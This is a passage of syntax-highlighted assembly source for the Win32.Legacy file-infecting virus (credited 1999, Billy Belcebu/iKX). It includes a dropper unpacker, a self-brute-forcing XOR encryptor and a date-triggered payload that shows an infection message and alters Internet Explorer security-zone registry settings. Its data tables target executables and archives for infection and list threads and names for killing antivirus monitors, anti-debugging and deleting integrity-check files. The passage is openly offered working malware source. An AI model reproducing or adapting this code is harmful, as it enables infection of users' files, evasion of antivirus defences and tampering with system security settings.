</span><span class="sc5">r_range</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Dropper unpacker (22 bytes)                                            ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Even more optimized version of the one in Win32.Thorin!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ÜÜÜ     ÜÜÜÜÜÜÜ ÜÜÜÜÜÜÜ ÜÜÜÜÜÜÜ </span><span class="sc0">
</span><span class="sc1">; Û Û     Û ÜÜÜÜÛ Û ÜÜÜÜÛ Û ÜÜÜÜÛ The Little and Shitty Compression Engine</span><span class="sc0">
</span><span class="sc1">; Û ÛÜÜÜÜ ÛÜÜÜÜ Û Û ÛÜÜÜÜ Û ÜÜÜÛÜ Poorly coded and written by...</span><span class="sc0">
</span><span class="sc1">; ÛÜÜÜÜÜÛ ÛÜÜÜÜÜÛ ÛÜÜÜÜÜÛ ÛÜÜÜÜÜÛ Who cares? :) Well... by me. Any problem?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is a very simple packing engine, based in the repetition of zeros that</span><span class="sc0">
</span><span class="sc1">; the PE  files have, thus it is  able to compress a PE file... Hehehe, i can</span><span class="sc0">
</span><span class="sc1">; put a dropper without caring about  its space! That was  the only reason of</span><span class="sc0">
</span><span class="sc1">; make this little shit. Maybe one day i will make a 'real' compression engi-</span><span class="sc0">
</span><span class="sc1">; ne, but today i'm too busy :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;        EDI = Offset where unpack</span><span class="sc0">
</span><span class="sc1">;        ESI = Data to unpack</span><span class="sc0">
</span><span class="sc1">;        ECX = Size of packed data</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;        Nothing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">LSCE_UnPack</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">; 1 byte        Whoa! I've</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; 2 bytes       optimized some</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">store_byte</span><span class="sc0">                      </span><span class="sc1">; 2 bytes       more bytes,</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; 1 byte        and Super only</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; 1 byte        helped me with</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">                                   </span><span class="sc1">; 2 bytes       one! I've done</span><span class="sc0">
    </span><span class="sc6">cwde</span><span class="sc0">                                    </span><span class="sc1">; 1 byte        the rest! :)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; 1 byte</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; 2 bytes</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; 1 byte</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; 2 bytes</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; 1 byte</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                          </span><span class="sc1">; 1 byte</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">store_byte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; 1 byte</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">LSCE_UnPack</span><span class="sc0">                     </span><span class="sc1">; 2 bytes</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">; 1 bytes</span><span class="sc0">
</span><span class="sc5">LSCE_UnPack</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| [iENC] - Internal ENCryptor engine v1.00                               ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; iENC_encrypt</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ESI = Pointer to iENC structure</span><span class="sc0">
</span><span class="sc1">;       EDI = Pointer to where virus will be appended</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       Nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">iENC_encrypt</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">cwde</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">cwde</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">

</span><span class="sc5">iENC_encl00p</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">iENC_encl00p</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc5">Billy_Bel</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">iENC_encrypt</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">iENC_encrypt</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc3">"[iENC v1.00]"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">; iENC_decrypt</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">iENC_decrypt</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">; Save all registers</span><span class="sc0">
    </span><span class="sc6">pushfd</span><span class="sc0">                                  </span><span class="sc1">; Save flags</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = Return address</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; EBX = CRC32</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = Size of block</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                         </span><span class="sc1">; EAX = Ptr to block</span><span class="sc0">

    </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">; EDX = 0</span><span class="sc0">
</span><span class="sc5">iENC_l00p</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">; Preserve all registers</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">iENC_subl00p</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">               </span><span class="sc1">; XOR a byte</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Point to next one</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">iENC_subl00p</span><span class="sc0">                    </span><span class="sc1">; And try it too</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">                           </span><span class="sc1">; Do the CRC's match?</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">iENC_Ok</span><span class="sc0">                         </span><span class="sc1">; If so, all is ok.</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">iENC_subl00p2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">               </span><span class="sc1">; Reencrypt: doesn't match</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">iENC_subl00p2</span><span class="sc0">       
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; Try with another key</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">iENC_l00p</span><span class="sc0">

</span><span class="sc5">iENC_Ok</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popfd</span><span class="sc0">                                   </span><span class="sc1">; Restore flags</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">; Restore registers</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">08h</span><span class="sc0">             </span><span class="sc1">; Fix return address</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">; Pffff!</span><span class="sc0">
</span><span class="sc5">iENC_decrypt</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Virus payload                                                          ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">

</span><span class="sc5">payload</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlock13</span><span class="sc4">-</span><span class="sc5">Block13</span><span class="sc0">

</span><span class="sc5">Block13</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SYSTEMTIME</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Get day, month, etc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetSystemTime</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ST_wMonth</span><span class="sc4">],</span><span class="sc5">nMonth</span><span class="sc0"> </span><span class="sc1">; Is July?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_payload</span><span class="sc0">
                         
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ST_wDay</span><span class="sc4">],</span><span class="sc5">nDay</span><span class="sc0">     </span><span class="sc1">; Is 31?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_payload</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00001000h</span><span class="sc0">                       </span><span class="sc1">; Kewl! Show copyrightz msgs</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szTtl</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szMsg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_MessageBoxA</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Disposition</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Make a little trick for the</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Explorer...</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">000F003Fh</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">pushs</span><span class="sc0">   </span><span class="sc3">"Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0"</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000001h</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_RegCreateKeyExA</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">13d</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">over_ttl</span><span class="sc0">
</span><span class="sc5">szTtl</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"[Win32.Legacy."</span><span class="sc0">
    </span><span class="sc9">IF</span><span class="sc0">      </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"debug."</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">
    </span><span class="sc5">vsize</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">" v1.00]"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">over_ttl</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc5">pushs</span><span class="sc0">   </span><span class="sc3">"DisplayName"</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_RegSetValueExA</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">
</span><span class="sc5">no_payload</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">payload</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">szMsg</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Welcolme to the Win32.Legacy payload. You are infected by a virus,"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"i am your worst nightmare... But BEWARE! Your organism is also "</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"infected. So go to the doctor and ask him for a cure for this..."</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc1">; Since here, the message is a bullshit :)</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Featuring:"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc3">"MultiMedia eXtensions Engine [MMXE v1.01]"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc3">"Polymorphic Header Idiot Random Engine [PHIRE v1.00]"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc3">"Internal ENCryptor technology [iENC v1.00]"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc3">"Greetings:"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc3">"StarZer0/iKX &amp; Int13h -&gt; Thanx for information about archives"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc3">"Murkry/iKX -&gt; Thanx for 'Win95 Structures &amp; Secrets' article"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc3">"zAxOn/DDT -&gt; Thanx for getting me into ASM"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc3">"Benny/29A -&gt; Thanx for information about threads"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc3">"The Mental Driller/29A -&gt; Thanx for polymorphy ideas"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc3">"Super/29A -&gt; Thanx for optimization knowledge &amp; opcode list"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc3">"Wintermute -&gt; Thanx for emulation ideas"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc3">"Ypsilon -&gt; Thanx for NT information &amp; cool ideas"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc3">"I don't like the drugs..."</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc3">"But the drugs like me!"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"(c) 1999 Billy Belcebu/iKX"</span><span class="sc4">,</span><span class="sc2">09</span><span class="sc4">,</span><span class="sc2">09</span><span class="sc4">,</span><span class="sc3">"&lt; billy_belcebu@mixmail.com &gt;"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">eBlock13</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Data                                                                   ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">      </span><span class="sc5">DEBUG</span><span class="sc0">
</span><span class="sc5">SEARCH_MASK</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GOAT???."</span><span class="sc0">
        </span><span class="sc9">ELSE</span><span class="sc0">
</span><span class="sc5">SEARCH_MASK</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"*."</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">EXTENSION</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">Extensions_Table</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"EXE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SCR"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CPL"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"RAR"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ARJ"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">nExtensions</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Extensions_Table</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">ThreadsTable</span><span class="sc0">            </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ThrKillMonitors</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ThrAntiDebugger</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ThrDeleteCRC</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ThrPerProcess</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ThrPrepareInf</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ThrInfectFiles</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">nThreads</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ThreadsTable</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Monitors2Kill</span><span class="sc0">           </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"AVP Monitor"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Amon Antivirus Monitor"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">Billy_Bel</span><span class="sc0">

</span><span class="sc5">Files2Kill</span><span class="sc0">              </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ANTI-VIR.DAT"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CHKLIST.DAT"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
